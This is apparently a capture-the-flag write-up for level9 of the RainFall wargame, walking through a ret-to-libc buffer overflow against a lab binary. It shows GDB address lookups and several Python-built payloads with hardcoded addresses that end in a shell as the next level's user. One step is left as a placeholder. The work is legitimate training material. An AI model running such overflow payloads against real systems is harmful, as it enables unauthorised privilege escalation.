## Flag9 README: Finding Flag9

We are now into `/home/user/level9`

We have a program called **level9**
We dowload it with our best friend command:
```sh
scp -P 4343 level9@localhost:/home/user/level9/level9 ~
```

After decompilation (cf [source](../source))
We realize we had a function called at the end of the program.
Okay so our plan is to execute a `/bin/bash` into this program. So after doing some research we find a exploit called `ret to libc`. Which basicly is change the address of a ret in a function from his old address from a adress into `libc`. Here we want to switch it with address of `system + exit + /bin/sh`.

So the payload is going to look like:
```
PAYLOAD= padding + address of system + adress of exit + address of /bin/sh
```

Okay let's find out adresses...

For `system` and `exit`, no difficulty here, we are using command `print` of GDB:

```sh
(gdb) p system
$2 = {<text variable, no debug info>} 0xb7d86060 <system>
(gdb) p exit
$3 = {<text variable, no debug info>} 0xb7d79be0 <exit>
(gdb)
```

Okay, nex step, we need to find the address of `/bin/sh`, a bit harder but don't worry we spare you researches:

```sh
?????????
```
Okay now we have all our address.

Now we need to find where to put it...
As you can see we have a buffer of `108`.
OKay so let's try our payload like:
```sh
./level9 $(python -c 'print("\xe0\x9b\xd7\xb7" + "\x58\x7c\xea\xb7" + "\x90" * 96 + "\x0c\xa0\x04\x08")')
```
Nothing happens.
After analyzing our program, we understood that we needed to pass pointer of pointer.
Okay no problem:

```sh
level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "\xe0\x9b\xd7\xb7" + "\x58\x7c\xea\xb7" + "\x90" * 96 + "\x0c\xa0\x04\x08")')
sh: 1: 
       : not found
level9@RainFall:~$ 
```

Something happened ...
But we cannot run any command.
We tryed some stuff like :
```sh
$(python -c 'print("\x60\x60\xd8\xb7" + "\xe0\x9b\xd7\xb7" + "\x58\x7c\xea\xb7" + "\x90" * 96 + "\x0c\xa0\x04\x08")' + "; cat ../bonus0/.pass")
```
But it did not work.
After few tries, we came up with a solution :

```sh
$(python -c 'print("\x60\x60\xd8\xb7" + "\xe0\x9b\xd7\xb7" + "\x58\x7c\xea\xb7" + "\x90" * 96 + "\x0c\xa0\x04\x08")' + ";/bin/sh")
```

And voila we are now log with bonus0

```sh
level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "\xe0\x9b\xd7\xb7" + "\x58\x7c\xea\xb7" + "\x90" * 96 + "\x0c\xa0\x04\x08" + ";/bin/sh")')
sh: 1: 
       : not found
$ whoami
bonus0
$ 
```